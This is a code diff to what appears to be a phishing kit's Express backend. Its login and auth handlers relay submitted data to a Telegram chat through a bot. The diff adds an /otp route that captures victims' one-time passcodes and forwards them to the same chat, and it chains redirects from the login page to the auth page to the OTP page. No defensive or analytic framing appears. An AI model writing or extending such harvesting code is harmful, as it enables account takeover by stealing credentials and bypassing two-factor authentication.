@@ -27,7 +27,6 @@ app.post("/login", (req, res) => {
   bot.sendMessage(TELEGRAM_CHAT_ID, loginMessage)
     .then(() => {
       console.log("Login data sent to Telegram");
-      // Redirect to auth.html
       res.redirect("/auth.html");
     })
     .catch((error) => {
@@ -46,11 +45,29 @@ app.post("/auth", (req, res) => {
   bot.sendMessage(TELEGRAM_CHAT_ID, authMessage)
     .then(() => {
       console.log("Auth code request sent to Telegram");
-      res.send("Authorization code request sent!");
+      res.redirect("/otp.html");
     })
     .catch((error) => {
       console.error("Error sending auth code request to Telegram:", error.message);
       res.status(500).send("Error sending auth code request to Telegram");
+    });
+});
+
+// Handle POST request for OTP form (otp.html)
+app.post("/otp", (req, res) => {
+  const { code } = req.body;
+  console.log("Received OTP:", { code });
+
+  // Send OTP to Telegram
+  const otpMessage = `OTP submitted:\nCode: ${code}`;
+  bot.sendMessage(TELEGRAM_CHAT_ID, otpMessage)
+    .then(() => {
+      console.log("OTP sent to Telegram");
+      res.send("Authorization code submitted successfully!");
+    })
+    .catch((error) => {
+      console.error("Error sending OTP to Telegram:", error.message);
+      res.status(500).send("Error sending OTP to Telegram");
     });
 });
 
